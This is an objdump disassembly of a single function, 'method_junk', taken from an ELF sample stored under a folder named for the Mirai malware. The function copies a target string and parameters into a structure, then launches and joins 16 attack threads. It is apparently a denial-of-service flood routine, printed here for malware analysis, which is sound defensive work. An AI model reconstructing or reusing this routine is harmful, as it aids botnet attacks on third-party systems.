
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401190 <method_junk>:
  401190: 41 56                        	push	r14
  401192: 41 89 d6                     	mov	r14d, edx
  401195: 41 55                        	push	r13
  401197: 41 54                        	push	r12
  401199: 41 89 f4                     	mov	r12d, esi
  40119c: 55                           	push	rbp
  40119d: 48 89 fd                     	mov	rbp, rdi
  4011a0: 53                           	push	rbx
  4011a1: 89 cb                        	mov	ebx, ecx
  4011a3: 8d 43 ff                     	lea	eax, [rbx - 0x1]
  4011a6: 48 81 ec d0 00 00 00         	sub	rsp, 0xd0
  4011ad: 3d e2 ff 00 00               	cmp	eax, 0xffe2
  4011b2: 76 21                        	jbe	0x4011d5 <method_junk+0x45>
  4011b4: be e3 ff 00 00               	mov	esi, 0xffe3
  4011b9: bf c8 4c 41 00               	mov	edi, 0x414cc8
  4011be: 31 c0                        	xor	eax, eax
  4011c0: e8 0b 6d 00 00               	call	0x407ed0 <printf>
  4011c5: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  4011cc: 5b                           	pop	rbx
  4011cd: 5d                           	pop	rbp
  4011ce: 41 5c                        	pop	r12
  4011d0: 41 5d                        	pop	r13
  4011d2: 41 5e                        	pop	r14
  4011d4: c3                           	ret
  4011d5: 4c 8d ac 24 80 00 00 00      	lea	r13, [rsp + 0x80]
  4011dd: ba 50 00 00 00               	mov	edx, 0x50
  4011e2: 31 f6                        	xor	esi, esi
  4011e4: 4c 89 ef                     	mov	rdi, r13
  4011e7: e8 34 89 00 00               	call	0x409b20 <memset>
  4011ec: 48 89 ee                     	mov	rsi, rbp
  4011ef: ba 3f 00 00 00               	mov	edx, 0x3f
  4011f4: 4c 89 ef                     	mov	rdi, r13
  4011f7: 48 8d ac 24 80 00 00 00      	lea	rbp, [rsp + 0x80]
  4011ff: e8 60 8b 00 00               	call	0x409d64 <strncpy>
  401204: 44 89 a4 24 c0 00 00 00      	mov	dword ptr [rsp + 0xc0], r12d
  40120c: 89 9c 24 c8 00 00 00         	mov	dword ptr [rsp + 0xc8], ebx
  401213: 49 89 e4                     	mov	r12, rsp
  401216: 44 89 b4 24 c4 00 00 00      	mov	dword ptr [rsp + 0xc4], r14d
  40121e: c6 84 24 cc 00 00 00 00      	mov	byte ptr [rsp + 0xcc], 0x0
  401226: 48 89 e3                     	mov	rbx, rsp
  401229: 66 66 66 90                  	nop
  40122d: 66 66 90                     	nop
  401230: 31 f6                        	xor	esi, esi
  401232: 48 89 df                     	mov	rdi, rbx
  401235: 4c 89 e9                     	mov	rcx, r13
  401238: ba c0 19 40 00               	mov	edx, 0x4019c0
  40123d: 48 83 c3 08                  	add	rbx, 0x8
  401241: e8 aa 48 00 00               	call	0x405af0 <pthread_create>
  401246: 48 39 eb                     	cmp	rbx, rbp
  401249: 75 e5                        	jne	0x401230 <method_junk+0xa0>
  40124b: 31 db                        	xor	ebx, ebx
  40124d: 66 66 90                     	nop
  401250: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  401254: 31 f6                        	xor	esi, esi
  401256: 48 ff c3                     	inc	rbx
  401259: e8 5d 18 00 00               	call	0x402abb <pthread_join>
  40125e: 48 83 fb 10                  	cmp	rbx, 0x10
  401262: 75 ec                        	jne	0x401250 <method_junk+0xc0>
  401264: bf 68 50 41 00               	mov	edi, 0x415068
  401269: e8 de 6b 00 00               	call	0x407e4c <puts>
  40126e: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  401275: 5b                           	pop	rbx
  401276: 5d                           	pop	rbp
  401277: 41 5c                        	pop	r12
  401279: 41 5d                        	pop	r13
  40127b: 41 5e                        	pop	r14
  40127d: c3                           	ret
  40127e: 66 90                        	nop
